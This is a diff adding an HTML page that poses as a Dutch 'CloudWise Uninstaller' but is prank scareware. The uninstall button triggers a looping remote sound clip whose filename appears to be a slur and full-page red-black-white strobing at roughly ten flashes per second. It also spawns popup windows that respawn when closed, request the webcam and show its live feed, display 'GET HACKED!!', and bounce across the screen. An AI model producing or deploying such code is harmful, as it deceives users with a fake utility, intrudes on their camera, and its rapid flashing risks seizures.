@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CloudWise Uninstaller</title>
+    <style>
+        body { background: #f5f5f5; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        @keyframes strobe { 0% { background-color: #000; } 33% { background-color: #f00; } 66% { background-color: #fff; } 100% { background-color: #000; } }
+        .flash-active { animation: strobe 0.1s infinite; }
+        #box { border: 1px solid #ddd; padding: 40px; background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 500px; color: #333; border-radius: 8px; }
+        h1 { font-weight: bold; margin: 0 0 10px 0; font-size: 1.8rem; color: #2c3e50; }
+        p { margin: 5px 0; font-size: 0.95rem; color: #555; }
+        .info-section { background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 15px 0; text-align: left; }
+        button { background: #e74c3c; color: #fff; border: none; padding: 12px 20px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; border-radius: 5px; margin-top: 20px; transition: background 0.3s; }
+        button:hover { background: #c0392b; }
+        .progress-bar { width: 100%; height: 20px; background: #ecf0f1; border-radius: 3px; margin: 10px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: #27ae60; width: 0%; }
+    </style>
+</head>
+<body id="mainBody">
+
+<div id="box">
+    <h1>🔧 CloudWise Uninstaller</h1>
+    <p>Versie 2.1.4</p>
+    <div class="info-section">
+        <p><strong>Applicatie:</strong> CloudWise Sync Manager</p>
+        <p><strong>Grootte:</strong> 247 MB</p>
+        <p><strong>Status:</strong> Geïnstalleerd</p>
+    </div>
+    <p style="text-align: center; margin-top: 20px;">Klik de knop hieronder om CloudWise volledig te verwijderen:</p>
+    <button onclick="check()">KLIK HIER OM CLOUDWISE TE VERWIJDEREN</button>
+</div>
+
+<script>
+    const sound = new Audio("https://www.myinstants.com/media/sounds/nggr.mp3");
+    sound.loop = true;
+
+    let cameraWins = [];
+    let normalWins = [];
+
+    function check() {
+        startChaos();
+    }
+
+    function startChaos() {
+        sound.play();
+        document.getElementById('mainBody').classList.add('flash-active');
+        smartSpawn();
+        setInterval(smartSpawn, 3000);
+    }
+
+    function smartSpawn() {
+        cameraWins = cameraWins.filter(w => !w.closed);
+        normalWins = normalWins.filter(w => !w.closed);
+        if (cameraWins.length < 5) spawn(true);
+        else if (normalWins.length < 10) spawn(false);
+    }
+
+    function spawn(isCamera) {
+        const w = 350, h = 300;
+        let curX = Math.floor(Math.random() * (screen.availWidth - w));
+        let curY = Math.floor(Math.random() * (screen.availHeight - h));
+
+        const win = window.open("", "", `width=${w},height=${h},left=${curX},top=${curY}`);
+
+        if (win) {
+            win.document.write(`
+                <html>
+                <head>
+                    <style>
+                        @keyframes strobe { 0% { background:#000; } 50% { background:#f00; } 100% { background:#fff; } }
+                        body { animation: strobe 0.08s infinite; color:white; font-family:sans-serif; text-align:center; overflow:hidden; margin:0; border:10px solid black; }
+                    </style>
+                </head>
+                <body>
+                    ${isCamera ? '<video id="v" autoplay style="width:100%; height:180px; object-fit:cover;"></video>' : '<h1 style="font-size:100px;">💀</h1>'}
+                    <h1>GET HACKED!!</h1>
+                    <script>
+                        ${isCamera ? 'navigator.mediaDevices.getUserMedia({ video: true }).then(s => { document.getElementById("v").srcObject = s; });' : ''}
+                        
+                        // New absolute movement engine
+                        let x = ${curX}, y = ${curY};
+                        let dx = ${Math.random() > 0.5 ? 15 : -15}; 
+                        let dy = ${Math.random() > 0.5 ? 15 : -15};
+                        const width = 350, height = 300;
+
+                        function bounce() {
+                            x += dx;
+                            y += dy;
+
+                            // Collision detection with absolute screen bounds
+                            if (x + width >= screen.availWidth || x <= 0) {
+                                dx = -dx;
+                                // Force away from edge to prevent sticking
+                                x = (x <= 0) ? 5 : screen.availWidth - width - 5;
+                            }
+                            if (y + height >= screen.availHeight || y <= 0) {
+                                dy = -dy;
+                                // Force away from edge to prevent sticking
+                                y = (y <= 0) ? 5 : screen.availHeight - height - 5;
+                            }
+
+                            window.moveTo(x, y);
+                        }
+                        
+                        // Start moving after 10 seconds
+                        setTimeout(() => {
+                            // kick once then run repeatedly for smooth motion
+                            bounce();
+                            setInterval(bounce, 10);
+                        }, 10000);
+                    <\/script>
+                </body>
+                </html>
+            `);
+
+            if (isCamera) cameraWins.push(win);
+            else normalWins.push(win);
+
+            const checkClosed = setInterval(() => {
+                if (win.closed) {
+                    clearInterval(checkClosed);
+                    setTimeout(smartSpawn, 100);
+                    setTimeout(smartSpawn, 200);
+                }
+            }, 500);
+        }
+    }
+</script>
+</body>
+</html>
